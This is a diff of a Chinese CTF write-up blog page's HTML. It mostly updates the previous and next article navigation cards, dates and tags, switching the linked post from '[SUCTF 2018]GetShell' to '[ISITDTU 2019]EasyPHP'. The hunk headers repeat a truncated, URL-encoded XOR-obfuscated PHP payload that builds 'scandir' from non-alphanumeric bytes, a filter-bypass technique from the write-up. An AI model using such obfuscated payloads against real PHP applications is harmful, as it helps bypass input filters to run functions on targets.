+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/p/2917397323.html">
                     <div class="card-image">
@@ -807,9 +756,9 @@ scandir&#x3D;((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%f
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-08-16
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-16
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -822,6 +771,7 @@ scandir&#x3D;((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%f
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -844,13 +794,13 @@ scandir&#x3D;((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%f
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/p/1142081591.html">
+                <a href="/p/2441275844.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/53.jpg" class="responsive-img" alt="刷题笔记:[SUCTF 2018]GetShell">
+                        <img src="/medias/featureimages/74.jpg" class="responsive-img" alt="刷题笔记:[ISITDTU 2019]EasyPHP">
                         
-                        <span class="card-title">刷题笔记:[SUCTF 2018]GetShell</span>
+                        <span class="card-title">刷题笔记:[ISITDTU 2019]EasyPHP</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -861,7 +811,7 @@ scandir&#x3D;((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%f
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-14
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-15
                             </span>
                         <span class="publish-author">
                             
@@ -884,6 +834,10 @@ scandir&#x3D;((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%f
                     
                     <a href="/tags/Web/">
                         <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">PHP代码审计</span>
                     </a>
                     
                 </div>
